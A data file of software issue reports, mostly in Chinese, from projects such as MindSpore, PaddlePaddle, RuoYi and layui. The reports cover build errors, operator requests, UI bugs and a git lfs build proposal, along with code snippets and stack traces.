关于ajax页面跳转的问题,"在使用layui编写ajax的过程中，似乎是必须要设置return false的，不管是直接用layui的jquery还是layui的form.on，但是为什么设置了false过后，所有内部的跳转也不能生效？就禁用了所有跳转吗？这是什么设计？我前端需要后端的值进行判断来决定是否跳转新的界面，是需要重新弄jquery而不用layui的jquery去做吗？希望有大佬指点一下   <code>: $('#sendlog').click(function () { $.ajax({ url: ""{% url 'logcheck' %}"", method: 'post', data: { 'user': $('#user').val(), }, success:function (res) { if (res.sta === 2){ layer.alert(res.me); } else { window.location.href('http://www.baidu.com') } }, }); return false;"
Print float16 data,"Currently to print float16 data, we needed to cast it to built-in data type like float. We would like to overwrite the operator so that we can use to print.   <code>: &lt;&lt; std::cout &lt;&lt; float16_val"
关于子节点异常导致整个子流程重试,"现象：假如存在如下嵌套子流程，如果BBB中b2抛出异常，会导致条件节点aaa重试多次（如果有配置全局重试策略） 执行流程：如果b2抛出异常，配置全局重试2，则节点执行过程为aaa-&gt; b1-&gt; b2-&gt;aaa-&gt; b1-&gt; b2 期望：如果b2异常，只重试b2节点，而不是整个条件节点（子流程）重试   <code>: &lt;chain name=""test""&gt; &lt;then value=""aaa(BBB|ccc)""/&gt; &lt;/chain&gt; &lt;chain name=""BBB""&gt; &lt;then value=""b1,b2,b3""/&gt; &lt;/chain&gt;"
【编译构建工具】引入git lfs软件管理AKG Ascend后端二进制文件,"当前AKG Ascend后端算子编译支持依赖二进制文件libakg_ext.a，MindSpore和AKG Ascend源码编译过程中，会从服务器上下载libakg_ext.a并链接。考虑到服务器负载问题，当前考虑的方案是将libakg_ext.a二进制文件通过git lfs方式进行托管，为了进一步减轻lfs服务器膨胀速度，将libakg_ext.a拆分成.o文件存放到lfs服务器上。 git lfs方式管理AKG Ascend后端二进制文件 涉及如下几个流程： 1. 需引入编译构建工具，这个软件属于git的拓展工具，需要用户额外安装，MindSpore用户手册源码编译依赖中需增加对软件的依赖 2. AKG侧将二进制.o文件目录结构： 通过git lfs管理后，实际上AKG代码仓上的只是pointer文本文件，实际文件存放在lfs服务器上，这样就不怎么会占用AKG代码仓的容量。 3. AKG编译脚本修改 原有流程： AKG Ascend后端编译时，从网站上下载libakg_ext.a并解压成一堆.o文件，然后在编译libakg.so时链接这些.o文件。 新流程： 预先将libakg_ext.a解压成一堆.o文件，使用git lfs管理这些二进制.o文件，AKG主仓prebuild/x86_64和prebuild/aarch64目录下.o仅为lfs指针文本文件，内容指向.o实际在lfs服务器上的存放位置，文本文件很小，这样就不会导致AKG主仓膨胀。 需要开发者额外安装git lfs 软件，当本地安装了git lfs后，git clone akg会自动将那些.o文件从服务器下载至本地，否则本地.o只是一堆文本文件。此时若编译AKG Ascend时，cmake将会给出如下提示： 如果开发者忽略了此提示，当其运行AKG Ascend用例时，将会在源码里报错，此时同样给出提示： git lfs 缺点： 源码编译时需要额外安装git lfs软件 如果本地已经安装了git lfs软件，当时会下载git lfs track的那些.o文件到本地。当编译GPU版本时，即使不依赖那些.o，也会把.o给下载下来，会导致下载耗时变长。 不将git lfs track的.o文件下载到本地的情形有： 本地未安装git lfs，这时git clone就不会下载.o文件 本地安装了git lfs，这时clone代码时需使用如下命令： 4. CI适配：CI环境上安装git lfs软件 CI当前编译流水线中，这条流水线对应的编译环境需安装git lfs软件   <code>: https://repo.mindspore.cn git lfs git lfs prebuild/ ├── aarch64 | ├── x1.o | ├── x2.o └── x86_64 ├── x1.o ├── x2.o prebuild/aarch64/x1.o https://repo.mindspore.cn -- Warning: /home/test_lfs/akg/prebuild/x86_64/analyze_align_dynamic.cc.o is not a valid binary file. -- Warning: git lfs not found, you can perform the following steps: 1. Install git lfs, refer https://github.com/git-lfs/git-lfs/wiki/installation 2. After installing git lfs, executing the following commands: cd /home/test_lfs/akg git lfs pull 3. Re-compile the source codes -- Warning: Build AKG without Ascend back-end support TVMError: Check failed: target != ""cce"": Can not enable target cce, because akg Ascend back-end's binary file is not linked to libakg.so during the compiling process, please check the following cases: case 1: If compile akg with -DUSE_KC_AIR=1 or -DUSE_CCE_PROFILING=1, check if libakg_ext.a exists in akg_source_dir(CMAKE_CURRENT_SOURCE_DIR) or akg_build_dir(CMAKE_CURRENT_BINARY_DIR). case 2: If compile akg without -DUSE_KC_AIR=1 and -DUSE_CCE_PROFILING=1(compiling akg from mindspore belongs to this case), then you can perform the following steps: 1. Check if git lfs is installed, in not, install git lfs, refer https://github.com/git-lfs/git-lfs/wiki/installation 2. After installing git lfs, executing the following commands: cd akg_source_dir (e.g. cd /home/user_name/akg) git lfs pull 3. Re-compile the source codes git clone https://gitee.com/mindspore/akg.git GIT_LFS_SKIP_SMUDGE=1 git clone https://gitee.com/user/repo.git # 或 git -c filter.lfs.smudge= -c filter.lfs.required=false clone https://gitee.com/user/repo.git Compile_Ascend_ARM_CentOS"
Some of the topics has no documents because `alias`.,Some of the topics have no documents because ? Such as http://paddlepaddle.org/docs/develop/api/fluid/en/initializer.html   <code>: alias
【众智】【计算-AICPU接入】MatrixSolveLs,"AICPU算子接入 解决一个或多个线性最小二乘问题。 matrix rhs l2 fast Bool 属性 y 对应底层算子 对应底层AICPU算子MatrixSolveLs: @ops.RegisterGradient(""MatrixSolveLs"")   <code>: class MatrixSolveLs(Primitive):"
动态表格多选功能失效,"无 组件版本 latest 浏览器 all Server Side razor： 使用外部数据源填充data table作为动态表格的数据，设定IsMultipleSelect=""true""，表格前面的多选框鼠标点击无反应，功能失效   <code>: &lt;Table IsPagination=""true"" TItem=""DynamicObject"" @bind-SelectedRows=""SelectedItems"" DynamicContext=""DataTableDynamicContext"" IsMultipleSelect=""true"" IsBordered=""true"" IsStriped=""true"" ShowToolbar=""true"" ShowExtendButtons=""true""&gt; &lt;/Table&gt;"
[Clion   Conda Virtual Env] 编译sequence_padding_generated_sequence_padding出错 posix_memalign,"1）PaddlePaddle版本：develop 2）CPU：默认 3）GPU： 4）系统环境：Ubuntu 18.04 + conda 安装方式信息： 本地编译：请提供cmake命令，编译命令 3）docker编译：请提供docker镜像，编译命令 特殊环境请注明：如离线安装等 复现信息： 问题描述：请详细描述您的问题，同步贴出报错信息、日志/代码关键片段   <code>: +-----------------------------------------------------------------------------+ | NVIDIA-SMI 435.21 Driver Version: 435.21 CUDA Version: 10.1 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | |===============================+======================+======================| | 0 GeForce GT 710 Off | 00000000:01:00.0 N/A | N/A | | 35% 46C P0 N/A / N/A | 418MiB / 974MiB | N/A Default | +-------------------------------+----------------------+----------------------+ (smu) vimos@x86_64-conda_cos6-linux-gnu ? ~ conda env export name: smu channels: - conda-forge - defaults dependencies: - _libgcc_mutex=0.1=conda_forge - _openmp_mutex=4.5=0_gnu - binutils_impl_linux-64=2.33.1=he1b5a44_7 - binutils_linux-64=2.33.1=h9595d00_16 - bzip2=1.0.8=h516909a_2 - ca-certificates=2019.11.28=hecc5488_0 - certifi=2019.11.28=py38_0 - cmake=3.16.2=h28c56e5_0 - cudatoolkit=10.2.89=hfd86e86_0 - cudnn=7.6.5=cuda10.2_0 - expat=2.2.5=he1b5a44_1004 - gcc_impl_linux-64=7.3.0=hd420e75_4 - gcc_linux-64=7.3.0=h553295d_16 - gxx_impl_linux-64=7.3.0=hdf63c60_4 - gxx_linux-64=7.3.0=h553295d_16 - krb5=1.16.4=h2fd8d38_0 - ld_impl_linux-64=2.33.1=h53a641e_7 - libblas=3.8.0=14_openblas - libcblas=3.8.0=14_openblas - libcurl=7.65.3=hda55be3_0 - libedit=3.1.20170329=hf8c457e_1001 - libffi=3.2.1=he1b5a44_1006 - libgcc-ng=9.2.0=h24d8f2e_2 - libgfortran-ng=7.3.0=hdf63c60_4 - libgomp=9.2.0=h24d8f2e_2 - liblapack=3.8.0=14_openblas - libopenblas=0.3.7=h5ec1e0e_6 - libprotobuf=3.11.2=h8b12597_0 - libssh2=1.8.2=h22169c7_2 - libstdcxx-ng=9.2.0=hdf63c60_2 - libuv=1.34.0=h516909a_0 - make=4.2.1=h14c3975_2004 - nccl=2.5.6.1=hc6a2c23_0 - ncurses=6.1=hf484d3e_1002 - numpy=1.17.3=py38h95a1406_0 - openssl=1.1.1d=h516909a_0 - patchelf=0.10=he1b5a44_0 - pip=19.3.1=py38_0 - protobuf=3.11.2=py38he1b5a44_0 - python=3.8.1=h357f687_1 - readline=8.0=hf8c457e_0 - rhash=1.3.6=h14c3975_1001 - setuptools=45.0.0=py38_1 - six=1.13.0=py38_0 - sqlite=3.30.1=hcee41ef_0 - tk=8.6.10=hed695b0_0 - wheel=0.33.6=py38_0 - xz=5.2.4=h14c3975_1001 - zlib=1.2.11=h516909a_1006 prefix: /home/vimos/anaconda3/envs/smu #============================================================================= # Target rules for targets named nccl_wrapper # Build rule for target. nccl_wrapper: cmake_check_build_system $(MAKE) -f CMakeFiles/Makefile2 nccl_wrapper .PHONY : nccl_wrapper # fast build rule for target. nccl_wrapper/fast: $(MAKE) -f paddle/fluid/framework/fleet/CMakeFiles/nccl_wrapper.dir/build.make paddle/fluid/framework/fleet/CMakeFiles/nccl_wrapper.dir/build .PHONY : nccl_wrapper/fast [ 19%] Building NVCC (Device) object paddle/fluid/operators/math/CMakeFiles/sequence_padding.dir/sequence_padding_generated_sequence_padding.cu.o [ 19%] Linking CXX static library libnccl_context.a [ 19%] Built target nccl_context [ 19%] Building NVCC (Device) object paddle/fluid/operators/math/CMakeFiles/sequence_scale.dir/sequence_scale_generated_sequence_scale.cu.o /home/vimos/anaconda3/envs/smu/lib/gcc/x86_64-conda_cos6-linux-gnu/7.3.0/include/mm_malloc.h(34): error: allowing all exceptions is incompatible with previous function ""posix_memalign"" /usr/include/stdlib.h(580): here 1 error detected in the compilation of ""/tmp/tmpxft_0000267c_00000000-13_sequence_padding.compute_75.cpp1.ii"". CMake Error at sequence_padding_generated_sequence_padding.cu.o.Debug.cmake:276 (message): Error generating file /home/vimos/git/Paddle/cmake-build-debug-smu/paddle/fluid/operators/math/CMakeFiles/sequence_padding.dir//./sequence_padding_generated_sequence_padding.cu.o make[3]: *** [paddle/fluid/operators/math/CMakeFiles/sequence_padding.dir/build.make:65: paddle/fluid/operators/math/CMakeFiles/sequence_padding.dir/sequence_padding_generated_sequence_padding.cu.o] Error 1 make[2]: *** [CMakeFiles/Makefile2:49574: paddle/fluid/operators/math/CMakeFiles/sequence_padding.dir/all] Error 2 make[2]: *** Waiting for unfinished jobs.... /home/vimos/anaconda3/envs/smu/lib/gcc/x86_64-conda_cos6-linux-gnu/7.3.0/include/mm_malloc.h(34): error: allowing all exceptions is incompatible with previous function ""posix_memalign"" /usr/include/stdlib.h(580): here 1 error detected in the compilation of ""/tmp/tmpxft_0000269a_00000000-13_sequence_scale.compute_75.cpp1.ii"". CMake Error at sequence_scale_generated_sequence_scale.cu.o.Debug.cmake:276 (message): Error generating file /home/vimos/git/Paddle/cmake-build-debug-smu/paddle/fluid/operators/math/CMakeFiles/sequence_scale.dir//./sequence_scale_generated_sequence_scale.cu.o make[3]: *** [paddle/fluid/operators/math/CMakeFiles/sequence_scale.dir/build.make:65: paddle/fluid/operators/math/CMakeFiles/sequence_scale.dir/sequence_scale_generated_sequence_scale.cu.o] Error 1 make[2]: *** [CMakeFiles/Makefile2:51019: paddle/fluid/operators/math/CMakeFiles/sequence_scale.dir/all] Error 2 make[1]: *** [CMakeFiles/Makefile2:72335: python/CMakeFiles/paddle_python.dir/rule] Error 2 make: *** [Makefile:8224: paddle_python] Error 2"
Summary operator is not work when I record the value of init function,": /device gpu /device cpu /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Summary operator is not work when I record the value of init function As the above code show, the summary operator will not work, and I also can't find a summary operator in the graph.   <code>: class Net(nn.Cell): def __init__(self, value): self.value = value self.summary = P.ScalarSummary() def construct(self): self.summary('x', self.value) return self.value"
Knife4jAutoConfiguration.Knife4jEnhanceAutoConfiguration 是一个内部类，是否可以调整为一个独立的类,Knife4jAutoConfiguration.Knife4jEnhanceAutoConfiguration 是一个内部类，能否调整为一个独立的类，我想通过重载，覆盖一部分逻辑 版本信息 提供Knife4j、Spring Boot、Springfox、Springdoc-openapi等相关版本号信息 &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;spring-boot.version&gt;2.2.6.RELEASE&lt;/spring-boot.version&gt;   <code>: &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.6.RELEASE&lt;/version&gt; &lt;relativePath/&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;knife4j-openapi2-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;4.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.10.5&lt;/version&gt; &lt;/dependency&gt;
配置文件中数据库密码为明文,"本人意见： 可以通过jasypt进行处理，对于jasypt版本在3.0.0往上，需要在启动类vm中配置""-Djasypt.encryptor.password=XX""才行，并且yml文件中 <em>不能</em> 再加上password,只需加上如下两个参数即可:   <code>: jasypt: encryptor: algorithm: PBEWithMD5AndDES iv-generator-classname: org.jasypt.iv.NoIvGenerator"
最新代码下载后，运行ruoyi-system模块未做任何修改频繁报错,##希望尽快解决一下##   <code>: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'sysConfigController': Unsatisfied dependency expressed through field 'configService'; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysConfigServiceImpl': Invocation of init method failed; nested exception is org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.ruoyi.system.mapper.SysConfigMapper.selectConfigList at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:660) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.inject(AutowiredAnnotationBeanPostProcessor.java:640) at org.springframework.beans.factory.annotation.InjectionMetadata.inject(InjectionMetadata.java:119) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor.postProcessProperties(AutowiredAnnotationBeanPostProcessor.java:399) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.populateBean(AbstractAutowireCapableBeanFactory.java:1413) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:601) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:944) at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:754) at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:434) at org.springframework.boot.SpringApplication.run(SpringApplication.java:338) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1343) at org.springframework.boot.SpringApplication.run(SpringApplication.java:1332) at com.ruoyi.system.RuoYiSystemApplication.main(RuoYiSystemApplication.java:22) Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'sysConfigServiceImpl': Invocation of init method failed; nested exception is org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.ruoyi.system.mapper.SysConfigMapper.selectConfigList at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:160) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization(AbstractAutowireCapableBeanFactory.java:422) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1778) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:602) at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:524) at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1380) at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1300) at org.springframework.beans.factory.annotation.AutowiredAnnotationBeanPostProcessor$AutowiredFieldElement.resolveFieldValue(AutowiredAnnotationBeanPostProcessor.java:657) ... 20 common frames omitted Caused by: org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): com.ruoyi.system.mapper.SysConfigMapper.selectConfigList at org.apache.ibatis.binding.MapperMethod$SqlCommand.&lt;init&gt;(MapperMethod.java:235) at org.apache.ibatis.binding.MapperMethod.&lt;init&gt;(MapperMethod.java:53) at org.apache.ibatis.binding.MapperProxy.lambda$cachedInvoker$0(MapperProxy.java:108) at java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1660) at org.apache.ibatis.util.MapUtil.computeIfAbsent(MapUtil.java:36) at org.apache.ibatis.binding.MapperProxy.cachedInvoker(MapperProxy.java:95) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:86) at com.sun.proxy.$Proxy131.selectConfigList(Unknown Source) at com.ruoyi.system.service.impl.SysConfigServiceImpl.loadingConfigCache(SysConfigServiceImpl.java:153) at com.ruoyi.system.service.impl.SysConfigServiceImpl.init(SysConfigServiceImpl.java:38) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:389) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:333) at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor.postProcessBeforeInitialization(InitDestroyAnnotationBeanPostProcessor.java:157) ... 32 common frames omitted
[ST][MS][OPS] select算子不支持维度不同的广播,"select算子当输入的维度不同，但满足广播条件时，执行会报错，但pytorch可以支持 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :commit_id = ''[sha1]:deb67f2e,[branch]:(HEAD,origin/r1.8,r1.8)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_select_func_functional_broadcast   <code>: def test_ms_ops_select_func_functional_broadcast(self): """""" TestCase_Name:select算子functional接口测试，广播 TestCase_executeParam:env_Ascend,env_Gpu,env_Cpu,env_Mac_Cpu,env_Windows_Cpu; TestCase_customField1:Ops_Case,Pynative_Case;TestCase_stage:Kappa """""" assert self.init_success_flg input_cond = np.random.rand(1, 65, 54, 12, 5, 2) inputa = np.random.randn(5, 5, 65, 1, 12, 5, 2).astype(np.float32) inputb = np.random.randn(65, 54, 1, 5, 2).astype(np.float32) fact = SelectFactory(input_cond, inputa, inputb, np.float32, cond_idx=0.5) self.ms_log.step(""Step1: Start operator accuracy compare."") assert fact.forward_cmp() self.ms_log.step(""Step2: Start grad operator accuracy compare."") assert fact.grad_cmp() E ValueError: For 'Select', shape size of tensor condition, x and y must be equal. But got condition size: 6, x size: 7, y size: 5. E E ---------------------------------------------------- E - The Traceback of Net Construct Code: E ---------------------------------------------------- E The function call stack (See file '/home/jenkins/djl/code/solution_test/cases/04operator/11math/select/rank_0/om/analyze_fail.dat' for more details. Get instructions about `analyze_fail.dat` at https://www.mindspore.cn/search?inputValue=analyze_fail.dat): E # 0 In file /home/jenkins/djl/code/solution_test/common/ms_aw/operator/math/select_ops.py(25) E return ops.select(cond, inputa, inputb) E ^ E # 1 In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/function/array_func.py(1051) E return tensor_select_(cond, input_x, input_y) E ^ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/ops/select.cc:69 SelectInferShape /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:1134: ValueError"
ctx.draw() is undefined,"微信小程序第一次加载组件时，偶尔会出现此问题 1.开发基本信息 开发工具： HbuilderX，使用uni-app开发微信小程序；开发方式是vite+vue3+ts；引入组件的方式是： uni_modules版。 组件使用方式： 3.操作 启动小程序，第一次加载页面（组件）时，偶尔会报错。 暂时解决办法 修改“qiun-data-charts.vue”文件，找到使用ctx.draw()、cfu.option[cid].context.restore()的地方，做非空判断。修改之后不会出现此问题。   <code>: &lt;template&gt; &lt;qiun-data-charts class=""chart"" canvasId=""myCharts"" type=""line"" :opts=""opts"" :chartData=""chartData"" :canvas2d=""true"" /&gt; &lt;/template&gt; &lt;script lang=""ts"" setup&gt; &lt;/script&gt; const opts = ref({ ...... }); const chartData= ref({ ...... });"
查询用户时，用orgCode显示部门名称，造成在保存的时候用名字覆盖掉了部门的编码,版本号： 2.2.0 SysUserController里的queryPageList，queryUserByDepId，departUserList方法都采用相同的方式来显示用户所属部门名称，在修改并保存用户数据时，会造成orgCode的值变为部门名称。 建议在SysUser中增加属性来实现。 友情提示： 未按格式要求发帖，会直接删掉。   <code>: //TODO 临时借用这个字段用于页面展示 item.setOrgCode(useDepNames.get(item.getId()));
动态表格使用@bind-SelectedRows属性时造成行多选无效,"在动态表格中使用@bind-SelectedRows属性获得用户选择项时，造成页面多选无效，无法点击打勾，删除这一属性时功能正常。 ---------请删除上面提示信息以及本行--------- 无 组件版本 latest 浏览器 all Server Side razor： cs：   <code>: &lt;Table IsPagination=""true"" TItem=""DynamicObject"" DynamicContext=""DataTableDynamicContext"" @bind-SelectedRows=""SelectedItems"" IsMultipleSelect=""true"" IsBordered=""true"" IsStriped=""true"" ShowToolbar=""true"" ShowExtendButtons=""true""&gt; &lt;/Table&gt; private List&lt;DynamicObject&gt; SelectedItems { get; set; } = new List&lt;DynamicObject&gt;();"
【众智】【计算-AICPU开发】FractionalMaxPoolWithFixedKsize,"AICPUE算子接入 2D分数最大池化 Python层接口 可选输出，用于计算反向梯度。 接口目录：mindspore/ops/operations/nn_ops.py input_x random_samples y argmax 用于反向梯度算子的输入 ksize Union[int, tuple[int]] 必选属性 output_shape Union[int, tuple[int]] 必选属性 data_format string 属性 对应底层算子 对应底层算子FractionalMaxPoolWithFixedKsize 标杆接口参考 Pytorch接口: 3. 异常处理 4. 算子反向 接入反向算子FractionalMaxPoolGradWithFixedKsize。   <code>: argmax class FractionalMaxPoolWithFixedKsize(Primitive): REG_OP(FractionalMaxPoolWithFixedKsize) .INPUT(x, TensorType({DT_FLOAT16, DT_FLOAT, DT_DOUBLE, DT_INT32, DT_INT64})) .INPUT(random_samples, TensorType({DT_FLOAT16, DT_FLOAT, DT_DOUBLE})) .OUTPUT(y, TensorType({DT_FLOAT16, DT_FLOAT, DT_DOUBLE, DT_INT32, DT_INT64})) .OUTPUT(argmax, TensorType({DT_INT32, DT_INT64})) .REQUIRED_ATTR(ksize, ListInt) .REQUIRED_ATTR(output_shape, ListInt) .ATTR(data_format, String, ""NCHW"") .OP_END_FACTORY_REG(FractionalMaxPoolWithFixedKsize) torch._C._nn.fractional_max_pool2d"
mindspore.numpy.tile计算结果shape错误,": /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : 根据MindSpore API接口文档（https://www.mindspore.cn/docs/migration_guide/zh-CN/r1.5/api_mapping/pytorch_diff/npTile.html）可知： 与样例代码结果不符，但是如果将代码改成如下格式，就是正常的了：   <code>: v1.3.0 Python 3.7.5 import mindspore.numpy as mnp import numpy as np import mindspore as ms a = ms.Tensor(np.ndarray([1, 448, 448], dtype=ms.float32) out = mnp.tile(a, (1, 1, 1, 1) print(out) Tensor(shape=[1, 448, 448], dtype=Float32, value= [[[ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], IndentationError: unexpected indent [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], ... [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]]]) numpy.tile接口把输入的张量a复制reps指定的次数来构造一个数组。假设reps长度为d，a的维度为a.dim，复制的规则是： * 如果a.ndim = d：把a沿着各轴复制对应的reps次。 * 如果a.ndim &lt; d：通过添加新轴将 a.dim 提升为d维，再进行复制； * 如果a.ndim &gt; d：将通过在前面补1把reps提升为a.ndim，再进行复制。 import mindspore.numpy as mnp import numpy as np import mindspore as ms a = ms.Tensor(np.ndarray([1, 448, 448], dtype=ms.float32) out = mnp.tile(a, (2, 1, 1, 1) print(out) Tensor(shape=[2, 1, 448, 448], dtype=Float32, value= [[[[ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], ... [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]]], [[[ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], ... [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00], [ 0.00000000e+00, 0.00000000e+00, 0.00000000e+00 ... 0.00000000e+00, 0.00000000e+00, 0.00000000e+00]]]])"
Implement framework::Variable,"I am using a C++ technique called type-information hiding in this implementation. Compared with this design, my implementation doesn't use and thus doesn't rely on boost. Actually, this design relies nothing other than . Compare with Caffe2's implementation, mine doesn't use self-defined type inference mechanism like , which is defined in caffe2/core/typeid.{h,cc,test_cc}, and saved about 500 lines C++ code:   <code>: boost::any #include &lt;typeinfo&gt; caffe2::TypeMeta $ wc -l ~/work/caffe2/caffe2/core/typeid* 56 /Users/yiwang/work/caffe2/caffe2/core/typeid.cc 300 /Users/yiwang/work/caffe2/caffe2/core/typeid.h 136 /Users/yiwang/work/caffe2/caffe2/core/typeid_test.cc"
Fixing script for vae demo,"Recently, I tried running the vae demo, but it did not work well. The problem is caused by the reparameterization funciton, I changed it a bit as follow: The main issue in previous script is setting paramattr as eps. What is more, reducing z_dim size may get better result. Best wishes   <code>: def reparameterization(mu, logvar): eps = data_layer(name=""noise"", size=z_dim) with mixed_layer(act=LinearActivation()) as sigma: sigma += dotmul_operator(layer_math.sqrt(layer_math.exp(logvar)), eps) return mu + sigma"
